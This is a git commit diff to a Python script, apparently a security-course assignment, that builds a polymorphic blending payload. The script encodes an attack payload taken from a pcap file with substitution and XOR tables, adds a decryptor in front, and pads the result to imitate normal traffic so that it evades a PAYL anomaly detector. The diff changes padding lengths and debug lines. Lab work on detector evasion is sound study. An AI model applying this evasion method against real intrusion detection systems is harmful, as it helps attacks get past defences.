c9cfb626086cfc05b6e54db2a1244e7af856fb0d
tfz2101 <zhi.tianmu@gmail.com>
2017-07-27 16:36:03 -0400

    Update task1.py

--- task1.py
+++ task1.py
@@ -9,11 +9,16 @@ ATTACKBODY_PATH = "tzhi3.pcap" # replace the file name by the one you downloaded
 
 if __name__ == '__main__':
 	# Read in source pcap file and extract tcp payload
+	#TODO:ORIGINAL PAYLOADS!!MUST SWITCH BACK!
 	attack_payload = getAttackBodyPayload(ATTACKBODY_PATH)
 	artificial_payload = getArtificialPayload(ARTIFICIAL_PATH)
 
+	#attack_payload = 'abbcccddddeeee'
+	#artificial_payload = ''
+
 	print('normal string',artificial_payload)
 	print('attac string', attack_payload)
+
 	# Generate substitution table based on byte frequency in file
 	substitution_table = getSubstitutionTable(artificial_payload, attack_payload)
 
@@ -24,11 +29,12 @@ if __name__ == '__main__':
 		attack_payload=attack_payload.ljust(127,chr(0));
 	# For xor operation, so supply to a multiple of 4
 
-	while len(xor_table) < 132:
+	while len(xor_table) < 128: #132:
 		xor_table.append(chr(0))
 
+
 	# For xor operation, should be a multiple of 4
-	while len(adjusted_attack_body) < 124: # CHECK: 124 can be some other number (multiple of 4) per your attack trace length
+	while len(adjusted_attack_body) < 128: #124: # CHECK: 124 can be some other number (multiple of 4) per your attack trace length
 		adjusted_attack_body.append(chr(0))
 
 	# Read in decryptor binary to append at the start of payload
@@ -47,13 +53,18 @@ if __name__ == '__main__':
 	# Raw payload will be constructed by encrypted attack body and xor_table
 	raw_payload = b_list + adjusted_attack_body + xor_table
 
-	print(len(raw_payload))
-	print(len(artificial_payload))
-	'''
+
 	while len(raw_payload) < len(artificial_payload):
+	#for i in range(0,4):
+		#print('original payload',len(raw_payload))
 		padding(artificial_payload, raw_payload)
+		#print('new payload',len(raw_payload))
+
+
+
+
 
 	# Write prepared payload to Output file and test against your PAYL model
 	with open("output", "w") as result_file:
 		result_file.write(''.join(raw_payload))
-	'''
+
